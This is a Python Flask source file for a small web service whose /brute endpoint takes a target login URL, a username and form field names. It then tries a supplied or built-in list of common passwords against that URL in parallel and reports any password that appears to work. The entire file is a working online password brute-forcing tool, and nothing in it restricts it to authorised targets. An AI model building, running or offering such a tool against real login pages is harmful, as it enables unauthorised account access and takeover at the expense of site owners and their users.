from flask import Flask, request, jsonify
import requests
import concurrent.futures

app = Flask(__name__)

DEFAULT_PASSWORDS = [
    "admin123", "password", "123456", "qwerty", "letmein",
    "welcome", "login", "root", "123123", "passw0rd"
]

def try_login(target_url, username, password, field_map):
    data = {
        field_map["username"]: username,
        field_map["password"]: password
    }
    try:
        response = requests.post(target_url, data=data, timeout=5)
        if "invalid" not in response.text.lower():
            return password
    except requests.RequestException:
        return None
    return None

@app.route("/brute", methods=["POST"])
def brute_force():
    req = request.json
    target_url = req["target_url"]
    username = req["username"]
    field_map = req["form_fields"]

    # Use provided list or fallback to default
    password_list = req.get("passwords", DEFAULT_PASSWORDS)

    found = None
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {
            executor.submit(try_login, target_url, username, pw, field_map): pw
            for pw in password_list
        }
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found = result
                break

    return jsonify({
        "success": bool(found),
        "password": found,
        "attempted": len(password_list)
    })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5002)
